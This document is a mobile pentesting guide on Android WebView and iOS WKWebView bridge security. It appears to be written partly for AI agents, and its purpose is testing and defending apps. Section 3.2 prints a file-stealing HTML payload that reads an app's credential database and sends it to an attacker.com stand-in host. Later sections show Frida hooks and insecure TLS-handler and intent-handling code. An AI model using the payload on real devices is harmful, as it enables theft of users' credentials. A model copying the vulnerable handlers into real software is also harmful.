# WEBVIEW & HYBRID BRIDGE SECURITY TESTING (skills/webview-security-testing.md)
**Standard:** OWASP MASVS-PLATFORM | Android WebView & iOS WKWebView  
**Audience:** Senior Mobile Penetration Testers & WebView Agents  

---

## 1. WebView Threat Landscape
Modern mobile applications heavily utilize WebViews (Android `android.webkit.WebView` and iOS `WebKit.WKWebView`) to render web content, hybrid micro-apps, and authentication flows. When native applications bridge JavaScript execution with host operating system capabilities, security boundaries between the untrusted web and the application sandbox can blur.

---

## 2. JavaScript Interface Exploitation (`addJavascriptInterface`)

### 2.1 The Native Bridge Risk
Android provides `addJavascriptInterface(Object object, String name)` to expose Java objects to the JavaScript execution context of the WebView.

- **Android < 4.2 (API 16) RCE:** Complete Remote Code Execution via Java Reflection. Injected JavaScript can access `getClass().forName()` and invoke `Runtime.getRuntime().exec()`.
- **Android >= 4.2 (API 17+):** Only methods annotated with `@JavascriptInterface` can be invoked from JS.
- **Modern Exploitation (Logic & Data Exfiltration):**
  Even with `@JavascriptInterface` enforced:
  1. Methods exposing native Keystore / token extraction: e.g., `getToken()`, `getUserData()`, `signPayload()`.
  2. Methods executing native disk writes, file downloads, or launching activities: e.g., `openExternalUrl(String url)`, `downloadFile(String url, String path)`.
  3. Methods providing SQL or database access.
  4. If an attacker achieves Cross-Site Scripting (XSS) on the page loaded in the WebView or hijacks the network/DNS, they can invoke these exposed interfaces to hijack user sessions or compromise the device.

### 2.2 Frida Inspection Hook
```javascript
Java.perform(function() {
    var WebView = Java.use("android.webkit.WebView");
    WebView.addJavascriptInterface.overload('java.lang.Object', 'java.lang.String').implementation = function(obj, name) {
        console.log("[+] [WEBVIEW_BRIDGE] Injected Interface: '" + name + "' Object class: " + obj.getClass().getName());
        var methods = obj.getClass().getDeclaredMethods();
        for (var i = 0; i < methods.length; i++) {
            console.log("    -> Method: " + methods[i].toString());
        }
        return this.addJavascriptInterface(obj, name);
    };
});
```

---

## 3. Local File Access & Universal XSS

### 3.1 File Scheme Settings Matrix
Android WebViews feature three critical file access flags in `WebSettings`:
1. `setAllowFileAccess(boolean)`: Enables/disables `file://` URLs. Enabled by default in API < 30.
2. `setAllowFileAccessFromFileURLs(boolean)`: Controls whether JavaScript running in the context of a `file://` scheme can access other `file://` resources. Default `false` in modern Android.
3. `setAllowUniversalAccessFromFileURLs(boolean)`: Controls whether JavaScript running in a `file://` scheme can access resources from *any* origin (including `http://` and other `file://` URIs).

### 3.2 The UXSS File-Stealing Attack Chain
If `setAllowUniversalAccessFromFileURLs(true)` or `setAllowFileAccessFromFileURLs(true)` is set:
1. Attacker saves a malicious HTML file to public storage (e.g. `/sdcard/Download/payload.html`) or sends an intent to download it.
2. Attacker triggers the WebView to load the local file: `file:///sdcard/Download/payload.html`.
3. The malicious script uses `XMLHttpRequest` or `fetch()` to read sensitive app-private files:
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///data/data/com.target.app/databases/user_credentials.db", true);
xhr.responseType = "blob";
xhr.onload = function() {
    var reader = new FileReader();
    reader.onload = function() {
        fetch("https://attacker.com/steal?data=" + encodeURIComponent(reader.result));
    };
    reader.readAsText(xhr.response);
};
xhr.send();
</script>
```

---

## 4. Remote Web Content Debugging (`setWebContentsDebuggingEnabled`)

### 4.1 Exploitation of Debugging Flag
If an application leaves `WebView.setWebContentsDebuggingEnabled(true)` active in production:
- Any process or USB debugger (`adb`) can attach to the WebView via Chrome DevTools (`chrome://inspect`).
- An attacker with physical or ADB access can inspect the DOM, view encrypted session cookies, extract local storage, and execute arbitrary JavaScript directly inside the victim's authenticated WebView session.

### 4.2 Dynamic Force-Enablement for Pentesting
During an assessment, a senior pentester dynamically enables debugging via Frida to audit the WebView state:
```javascript
Java.perform(function() {
    var WebView = Java.use("android.webkit.WebView");
    WebView.setWebContentsDebuggingEnabled(true);
    console.log("[+] [WEBVIEW] setWebContentsDebuggingEnabled forced to TRUE");
});
```

---

## 5. SSL & TLS Error Handling Bypasses (`onReceivedSslError`)

### 5.1 The Insecure Handler
A common critical vulnerability in mobile apps occurs when developers override `WebViewClient.onReceivedSslError`:
```java
// Vulnerable: Blindly proceeding despite TLS validation failure
@Override
public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
    handler.proceed(); // CRITICAL: Completely neutralizes TLS!
}
```
If `handler.proceed()` is called unconditionally:
- An attacker on the local network (public Wi-Fi) can execute a basic Man-in-the-Middle (MitM) attack using an untrusted or self-signed certificate.
- The attacker injects malicious JavaScript into any HTTP/HTTPS page loaded by the WebView, weaponizing exposed JavaScriptInterfaces.

---

## 6. Intent Scheme URL Handling (`intent://`)

### 6.1 Unsafe `shouldOverrideUrlLoading`
If the WebView does not validate target URLs and parses `intent://` URIs using `Intent.parseUri(url, Intent.URI_INTENT_SCHEME)`:
```java
Intent intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
context.startActivity(intent);
```
- An attacker serving a web page can force the WebView to construct and launch arbitrary intents on the user's device.
- Attackers can target internal unexported components or trigger Intent Redirection.
